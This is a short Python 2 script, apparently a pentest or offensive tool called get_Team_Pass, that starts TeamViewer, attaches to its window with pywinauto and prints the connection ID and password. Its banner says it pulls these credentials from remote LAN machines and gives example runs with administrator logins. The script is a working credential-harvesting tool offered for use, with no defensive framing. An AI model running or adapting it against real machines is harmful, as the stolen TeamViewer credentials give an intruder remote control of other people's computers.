#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Autor: @Kr1shn4murt1 kronux.com.co
# Fecha: Sept 16 - 2018
# Fecha Actualizacion: Marzo 3 2020

import psutil
from pywinauto.application import Application
import time

print r''' 	 
	
		get_Team_Pass Version 1.1
 		This program gets teamviewer's ID and password from a remote
 		computer in the LAN. hook.exe must be in same folder as get_Team_Pass.exe

 		Execution examples:
 		get_Team_Pass.exe -h for printing the help
 		get_Team_Pass.exe -t 192.168.175.136 -u administrator -p Password2018
 		get_Team_Pass.exe -t 192.168.175.136 -u administrator -p Password2018 -d domain

 			@kr1shn4murt1
 			kronux.com.co
 			
 '''

# Start teamviewer and if already started bring window to the front
Application().start(r"C:\Program Files\TeamViewer\TeamViewer.exe")

time.sleep(3)

# Find the process id of teamviewer.exe
process = filter(lambda p: p.name() == "TeamViewer.exe", psutil.process_iter())
for i in process:
	pid= i.pid

# connect to teamviewer providing process id
app = Application().connect(process=pid)
window = app.Dialog


# Print connection ID
print ' ID: ', str(window.edit2.print_control_identifiers())

print '\n'

# Print connection password
print ' PASS: ', str(window.edit3.print_control_identifiers())
